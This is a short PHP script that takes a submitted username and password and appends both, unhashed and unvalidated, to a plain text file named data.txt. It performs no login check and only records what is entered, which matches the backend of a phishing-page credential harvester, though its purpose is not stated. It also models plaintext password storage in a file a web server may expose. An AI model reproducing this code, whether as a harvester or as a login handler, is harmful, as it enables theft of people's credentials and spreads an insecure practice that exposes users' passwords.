<?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'];
        $password = $_POST['password'];

        $data = "Username: " . $username . "\n" . "Password: " . $password . "\n\n";
        $file = fopen("data.txt", "a");
        fwrite($file, $data);
        fclose($file);

        echo "Data saved successfully!";
    }
?>